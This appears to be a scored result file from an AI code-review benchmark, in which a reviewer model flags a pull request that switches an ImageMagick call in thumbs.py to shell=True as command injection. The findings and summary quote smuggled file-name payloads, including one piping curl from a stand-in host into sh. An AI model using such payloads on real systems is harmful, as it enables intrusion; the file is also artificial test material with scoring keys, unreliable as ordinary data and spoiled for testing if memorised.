@@ -1,0 +1,92 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "ef19c30e9434",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 43.3,
+  "setup_seconds": 0.0,
+  "total_seconds": 43.4,
+  "usage": {
+    "in": 58580,
+    "cache_read": 59520,
+    "cache_write": 0,
+    "out": 2225,
+    "source": "cli"
+  },
+  "cost_usd": 0.148366,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "Switching from an argv list to `shell=True` with an f-string interpolates `upload_dir`, `name`, and `oid` into a shell command. Any of those values can inject metacharacters (`;`, `|`, `$(...)`, spaces) and run arbitrary commands as the reviewer/process user \u2014 e.g. `name` = `foo.png; id > /tmp/pwned`.\n\nImageMagick policy/delegates do not require a shell: keep the list form so paths stay opaque argv elements. If IM7 needs a different binary, use that path in argv only:\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nAlso restore the absolute binary path (or `/usr/bin/magick`) so a poisoned `PATH` cannot substitute another executable."
+    },
+    {
+      "path": "thumbs.py",
+      "line": 4,
+      "severity": "warning",
+      "body": "The new comment claims shell form is required for the ImageMagick policy delegate. That is incorrect: delegates and `policy.xml` apply when `convert`/`magick` is executed directly. The previous comment at least documented an upstream `ALLOWED_FILES` check on `name`; removing it hides the only mentioned sanitization while the code becomes more dangerous.\n\nRestore an accurate comment (and keep argv-list invocation). If IM7 needs `magick` instead of `convert`, document that executable choice \u2014 not `shell=True`."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change replaces a safe argv-list `subprocess.run` with `shell=True` and unquoted f-string interpolation of `upload_dir`, `name`, and `oid`, which is classic command injection.\n\n## Why this is wrong\n\nThe previous form:\n\n```python\nsubprocess.run([\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"], check=True)\n```\n\npasses paths as opaque argv elements. The shell never sees them, so metacharacters in any of the three parameters cannot spawn extra commands.\n\nThe new form:\n\n```python\nsubprocess.run(f\"convert {upload_dir}/{name} /srv/thumbs/{oid}.png\", shell=True, check=True)\n```\n\nhands the entire string to `/bin/sh`. A crafted `name` such as `x; curl evil.test | sh` (or similar in `upload_dir` / `oid`) runs as the process user. The PR also drops the absolute `/usr/bin/convert` path, so a poisoned `PATH` can substitute a different binary.\n\nThe stated rationale (\u201cImageMagick 7 needs the policy delegate\u201d) does not require `shell=True`. IM policy is enforced inside the `convert`/`magick` binary under normal `exec`, not via the shell. If IM7 needs the `magick` frontend or different args, keep the argv-list form and change only the executable/flags.\n\nThe removed comment that `name` was validated upstream by `ALLOWED_FILES` is also a regression in documentation; even with that validation, `upload_dir` and `oid` remain interpolated and unvalidated in-tree.\n\n## Recommendation\n\nRevert to argv-list form (optionally switch the binary to `/usr/bin/magick` if that is the IM7 requirement). Do not use `shell=True` for this conversion.\n\n**Recommendation:** request-changes",
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch replaces a safe argv-list `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid`, so metacharacters in those values become shell commands. Base used `/usr/bin/convert` with list args and no shell; the regression is real and severity critical is"
+    },
+    {
+      "path": "thumbs.py",
+      "line": 4,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.377,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2535,
+      "out": 393
+    },
+    "cost_usd": 0.008375
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
